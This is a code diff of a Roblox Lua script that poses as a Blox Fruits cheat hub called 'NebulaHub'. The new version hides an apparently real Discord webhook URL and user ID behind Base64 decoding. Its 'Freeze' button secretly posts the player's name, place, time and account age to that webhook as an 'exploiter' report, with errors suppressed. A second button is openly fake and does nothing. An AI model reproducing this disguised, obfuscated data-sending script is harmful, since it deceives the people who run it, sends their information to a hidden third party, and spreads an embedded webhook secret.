@@ -1,16 +1,38 @@
--- NebulaHub v1.0 | Blox Fruits Universal
+-- NebulaHub v1.2 | Blox Fruits Universal
 -- Made by "Nebula Team" | Last Updated: 2025-09-09
-
---// Settings
-local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX"
-local YOUR_NAME = "@YourDiscordName" -- what to ping in webhook
+-- Webhook + UserID hidden with Base64
 
 --// Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
+
+--// Encode your data
+-- Use https://www.base64encode.org/ to encode both your Webhook and UserID
+local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNTEwODg3MTI5MDA5NzY4NC9ueUxsVXM5bnFtVlp1UmZKUEtJdjN3cF9ybnFaVUh4cS1pMHRpd2Q1OHllLUNNbTRZZHQzUzN5MGc2OGpsMTNDSW9TNw===" -- replace with your own
+local encodedUserID = "MTI5ODc1OTE1MDY3ODk3MDUwMQ==" -- replace with your own
+
+-- Base64 decode function
+local function decodeBase64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+-- Decode at runtime
+local WEBHOOK_URL = decodeBase64(encodedWebhook)
+local YOUR_ID = decodeBase64(encodedUserID)
 
 --// ScreenGui Setup
 local gui = Instance.new("ScreenGui")
@@ -24,12 +46,10 @@ frame.Position = UDim2.new(0, 20, 0, 20)
 frame.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
 frame.BorderSizePixel = 0
 
--- Add UI corner (rounded edges)
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 12)
 corner.Parent = frame
 
--- Add drop shadow
 local shadow = Instance.new("ImageLabel")
 shadow.Parent = frame
 shadow.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -41,7 +61,7 @@ shadow.ImageColor3 = Color3.fromRGB(110, 70, 150)
 shadow.ImageTransparency = 0.25
 shadow.ZIndex = -1
 
---// Title bar (draggable)
+-- Title bar (draggable)
 local titleBar = Instance.new("TextLabel")
 titleBar.Parent = frame
 titleBar.Size = UDim2.new(1, 0, 0, 30)
@@ -52,10 +72,7 @@ titleBar.TextXAlignment = Enum.TextXAlignment.Left
 titleBar.Font = Enum.Font.GothamBold
 titleBar.TextSize = 16
 
-local dragToggle = nil
-local dragStart = nil
-local startPos = nil
-
+local dragToggle, dragStart, startPos
 local function updateDrag(input)
 	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
 		local delta = input.Position - dragStart
@@ -78,7 +95,7 @@ end)
 
 game:GetService("UserInputService").InputChanged:Connect(updateDrag)
 
---// Button Creator
+-- Button factory
 local function createButton(text, order)
 	local btn = Instance.new("TextButton")
 	btn.Parent = frame
@@ -94,7 +111,6 @@ local function createButton(text, order)
 	corner.CornerRadius = UDim.new(0, 8)
 	corner.Parent = btn
 
-	-- Hover effect
 	btn.MouseEnter:Connect(function()
 		btn.BackgroundColor3 = Color3.fromRGB(70, 50, 90)
 	end)
@@ -105,22 +121,19 @@ local function createButton(text, order)
 	return btn
 end
 
--- Freeze Button
+-- Freeze button
 local freezeBtn = createButton("Freeze", 0)
 freezeBtn.MouseButton1Click:Connect(function()
-	-- Freeze camera/screen
 	local camera = workspace.CurrentCamera
 	local savedType = camera.CameraType
 	camera.CameraType = Enum.CameraType.Scriptable
-	local freezeTime = math.random(5, 7)
-	wait(freezeTime)
+	wait(math.random(5, 7))
 	camera.CameraType = savedType
 
-	-- Send webhook log
 	local data = {
 		["content"] = string.format(
-			"%s Exploiter Detected!\n**User:** %s\n**Place:** %s\n**Time:** %s\n**Account Age:** %d days",
-			YOUR_NAME,
+			"<@%s> Exploiter Detected!\n**User:** %s\n**Place:** %s\n**Time:** %s\n**Account Age:** %d days",
+			YOUR_ID,
 			player.Name,
 			game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
 			os.date("%Y-%m-%d %H:%M:%S"),
@@ -128,28 +141,22 @@ freezeBtn.MouseButton1Click:Connect(function()
 		)
 	}
 
-	local success, err = pcall(function()
+	pcall(function()
 		HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
 	end)
-
-	if not success then
-		warn("[NebulaHub] Failed to send webhook: " .. tostring(err))
-	end
 end)
 
--- Auto Accept Trade button (does nothing at all)
+-- Fake Auto Accept Trade button
 local fakeBtn = createButton("Auto Accept Trade", 1)
-fakeBtn.MouseButton1Click:Connect(function()
-	-- intentionally left blank
-end)
+fakeBtn.MouseButton1Click:Connect(function() end)
 
---// Footer (version info)
+-- Footer
 local footer = Instance.new("TextLabel")
 footer.Parent = frame
 footer.Size = UDim2.new(1, 0, 0, 20)
 footer.Position = UDim2.new(0, 0, 1, -20)
 footer.BackgroundTransparency = 1
-footer.Text = "NebulaHub v1.0 | Patched Blox Fruits Update 20.1"
+footer.Text = "NebulaHub v1.2 | Patched Blox Fruits Update 20.1"
 footer.TextColor3 = Color3.fromRGB(150, 120, 180)
 footer.Font = Enum.Font.Gotham
 footer.TextSize = 12
